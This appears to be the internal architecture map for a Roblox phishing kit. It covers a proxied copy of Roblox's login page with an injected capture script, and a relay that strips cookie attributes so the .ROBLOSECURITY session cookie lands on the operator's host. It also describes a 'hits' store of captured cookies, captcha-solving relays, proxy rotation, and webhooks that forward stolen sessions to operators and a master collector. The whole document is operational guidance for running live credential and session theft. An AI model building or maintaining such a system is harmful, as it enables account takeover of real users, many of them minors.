# CODEBASE-MAP.md

Read this before touching anything. Line anchors drift — re-grep before editing.

---

## 1. What runs

| service | entry | stack | port | state |
|---|---|---|---|---|
| dashboard + capture + proxies | `server.js` (~4,800 lines, 97 route registrations) | Node 18+, Express 4, express-session | `PORT` (default 3000) | JSON files locally; Vercel Blob in prod |
| account panel | `account-panel/app.py` | Python, FastAPI + Playwright (sync) | 127.0.0.1:8100 | `mock_accounts.db` + `out/` |

- Local: `start.bat` / `npm start` (`index.js` requires `server.js`).
- Vercel: `api/index.js` exports the Express app; every path rewrites to it (`vercel.json`). `server.js` skips `listen()` when `VERCEL` is set.
- Apache/VPS: the app sits behind `mod_proxy`. `.htaccess` denies direct access to source, secrets and captured data, then proxies everything else to `127.0.0.1:3000`. The legacy PHP lane is no longer routed.

## 2. Request path

```
static files ────────────────► express.static(public/)
?key=<OPERATOR_KEY> ─────────► sets signed `op` cookie, redirects (server.js, early middleware)
session (file store) ────────► JsonSessionStore, debounced writes
/api/op/unlock ──────────────► public, rate-limited, sets `op` cookie
/api/* ──────────────────────► apiGuard (security.js)
   public prefixes: victim login + catalog reads, capture beacon (signed nonce), client-error
   everything else: session OR operator cookie OR genuine loopback (no proxy headers)
/login ──────────────────────► loginPage (lib/pages/login.js) — proxied Roblox HTML + capture script (signed nonce)
/capture, /capture.php ──────► phpCaptureHandler → captureLoginHandler
/proxy/roblox/* ─────────────► allowlisted relay; auth POSTs are observed, cookies captured
```

## 3. Core modules

| file | job |
|---|---|
| `security.js` | session store (coalesced writes), operator key + cookie, auth gate, rate limits, escaping, atomic JSON, upstream allowlist |
| `lib/capture-nonce.js` | stateless HMAC nonce for the public capture beacon |
| `lib/store.js` | KV / Vercel Blob / file persistence, serialized writes |
| `lib/runtime.js` | writable data dir (`/tmp` on Vercel), seeded copies |
| `lib/pages/login.js` | 1:1 Roblox login render, URL rewrites, capture script |
| `lib/pages/profile.js` | profile renderer + fake identity patcher |
| `lib/pages/community.js` | community renderer |
| `twofactor.js` | Roblox auth engine (CSRF, PoW, captcha, 2SV), cookie validation, secure auth intent |
| `truelogin.js` | thin adapter over the auth engine |
| `captcha-relay.js` | self-hosted Arkose relay |
| `captcha-solver.js` | paid 2captcha fallback |
| `proxy-rotation.js` | proxy pool (rotation interval unref'd, stats writes debounced) |
| `unified-webhook.js` | delivery keyed by operator; master quadhook receives everything |
| `rich-data-capture.js` | post-auth enrichment off the cookie |
| `profile-templates.js` | template → generated profiles |
| `site-generator.js` | triplehook/dualhook tenants |

## 4. Auth model

Three ways in, checked in order by `isOperatorAuthorized`:

1. Discord OAuth session (`req.session.user`, id must not be `public`).
2. Signed `op` cookie — set by `/?key=<OPERATOR_KEY>` or `POST /api/op/unlock`. Value is `HMAC(SESSION_SECRET, "operator:"+key)`, httpOnly, 12h.
3. Genuine loopback — request must arrive with **no** proxy headers (`x-forwarded-for`, `x-real-ip`, `forwarded`, …) and both `req.ip` and the socket peer must be loopback.

`DASHBOARD_OPEN=true` opens the panel *page* only. It does not open capture data.

`app.set('trust proxy', 'loopback')` — the old `true` trusted any client-supplied `X-Forwarded-For` and made the operator gate a header.

## 5. Login → cookie → Hits path

1. `/login` serves Roblox's own page; `proxy-shim.js` is injected.
2. Shim relays auth endpoints on `www.roblox.com` (`/v2/login`, `/v2/authenticate`, `/v1/authentication*`, `/users/authenticated`, …) through `/proxy/roblox/`. Ordinary navigation stays on the real site. **This is what makes the cookie land on our origin.**
3. The relay forwards `Set-Cookie` from Roblox with `Domain`/`Secure` stripped, so `.ROBLOSECURITY` is stored for this host.
4. The relay reads the cookie from the response (and from any later inbound `Cookie` header) and writes one hit row:
   - attempt row created on the credential POST,
   - updated in place with cookie, user, RICH data, verification state,
   - duplicate suppressed by cookie tail for 90s.
5. `/api/login-state` tells the page to bounce to the real Roblox home.

`AUTH_SERVER_HANDSHAKE=true` switches the credential POST to a server-side CSRF/PoW exchange (forces the 2SV gate; cannot clear device challenges).

## 6. Data on disk

```
hits.json            captures (capped 500), includes cookie + cookieVerified
visits.json          page visits (capped 500)
signins.json         confirmed sign-ins only (no id → no row)
webhooks.json        per-operator hooks + master quadhook
sessions.json        debounced file session store
login_log.txt        metadata only — no passwords, no 2FA codes
storage/logs/        capture log — metadata only
storage/templates/   profile templates
storage/sites.json   tenant registry
```

Vercel: `BLOB_READ_WRITE_TOKEN` or `KV_REST_API_*` switches `lib/store.js` to a shared backend; otherwise every instance gets its own `/tmp` and hits vanish across lambdas.

`.htaccess` denies direct HTTP access to every non-`public/` file. Do not remove those rules without moving the app out of the document root.

## 7. Environment

| var | use |
|---|---|
| `SESSION_SECRET` | required; sessions + nonce/operator HMAC |
| `OPERATOR_KEY` | remote operator access; `/?key=…` or unlock form |
| `DASHBOARD_OPEN` | page-only escape hatch (data stays gated) |
| `COOKIE_SECURE` | `false` disables secure cookies for local http |
| `TRUST_PROXY` | `true` trusts the whole chain; default is `loopback` |
| `ALLOWED_ORIGINS` | CORS allowlist for the auth proxy |
| `AUTH_SERVER_HANDSHAKE` | server-side credential exchange |
| `CAPTCHA_API_KEY` | paid solver |
| `BLOB_READ_WRITE_TOKEN` / `KV_REST_API_*` | shared store |

`.env` holds live secrets and is git-ignored. Rotate it if the folder leaves the machine.

## 8. Checks

```
npm test     # route-order guard + syntax check
npm start    # local
```

`scripts/check-route-order.js` fails if an `/api` route is registered above the auth gate without being on the known-public list.

## 9. Gotchas

1. Route order is the auth model — keep new `/api` routes below `app.use('/api', apiGuard)`.
2. JSON files are the database locally. One Node process per folder; the session store and hits store assume that.
3. Two proxies on the same folder will shred the JSON stores. Use the shared backend for anything multi-instance.
4. `AUTH_SERVER_HANDSHAKE=true` needs a residential IP or it hits `deviceintegrity`.
5. The capture beacon needs a valid signed nonce from `/login`. A capture POST without one is 403 by design.
6. `scratch/` is the instrument drawer — probes and scraped clients. Not shipped, not imported.

---

Built by Olivia — https://discord.gg/ojailbreaks
